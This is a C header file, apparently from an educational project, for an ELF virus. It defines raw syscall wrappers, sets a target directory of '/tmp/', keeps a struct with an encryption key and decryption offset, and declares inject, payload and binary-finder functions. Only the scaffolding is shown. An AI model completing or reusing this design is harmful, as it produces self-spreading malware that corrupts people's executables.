#ifndef FT_VIRUS_H
# define FT_VIRUS_H

# include <elf.h>
# include "./struct.h"

# define SYS_READ 0
# define SYS_WRITE 1
# define SYS_OPEN 2
# define SYS_CLOSE 3
# define SYS_FSTAT 5
# define SYS_LSEEK 8
# define SYS_MMAP 9
# define SYS_MUNMAP 11
# define SYS_EXIT 60
# define SYS_GETUID 102
# define SYS_GETDENT64 217

# define O_RDONLY 0
# define O_WRONLY 1
# define O_RDWR 2
# define O_DIRECTORY 0x10000

# define DT_REG 8
# define MAP_SHARED 1
# define PROT_READ 1
# define PROT_WRITE 2
# define MAP_FAILED ((void *)-1)


/*
# include <stdio.h>
# include <unistd.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
*/

# define FORCE_INLINE __attribute__((always_inline)) inline

# define WRITE(fd, buffer, len) syscall0(SYS_WRITE, fd, buffer, len)
# define READ(fd, buffer, len) syscall0(SYS_READ, fd, buffer, len)
# define OPEN(pathname, flags) syscall1(SYS_OPEN, pathname, flags)
# define CLOSE(fd) syscall2(SYS_CLOSE, fd)
# define EXIT(code) syscall2(SYS_EXIT, code)
# define FSTAT(fildes, buf) syscall3(SYS_FSTAT, fildes, (struct stat*)buf)
# define MMAP(addr, len, prot, flags, fildes, off) syscall6(SYS_MMAP, addr, len, prot, flags, fildes, off)
# define MUNMAP(addr, length) syscall1(SYS_MUNMAP, addr, length)

# define INFESTED_DIR "/tmp/"

typedef struct	s_file
{
	char	*file;
	size_t	len;
}				t_file;

typedef struct	s_data
{
	int	key;
	int	decrypt_start;
}		t_data;


/* syscalls.c */
size_t	syscall0(int syscall, int arg1, char *arg2, size_t arg3);
int	syscall1(int syscall, char *arg1, int arg2);
size_t	syscall2(int syscall, int arg1);
size_t	syscall3(int syscall, int arg1, void *arg2);
void *syscall6(int syscall, void *arg1, size_t arg2, int arg3, int arg4, int arg5, off_t arg6);

/* main.c */
void inject(int file_fd);
void payload(void);
void payload_end(void);

/* binary_finder.c */
int finder(int fd);

/* lib.c */
size_t	ft_strlen(char *str);
int	ft_memcmp(char *str1, char *str2, size_t len);
void	*ft_memcpy(char *dest, char *src, size_t len);
void	ft_putnbr(int n);

#endif
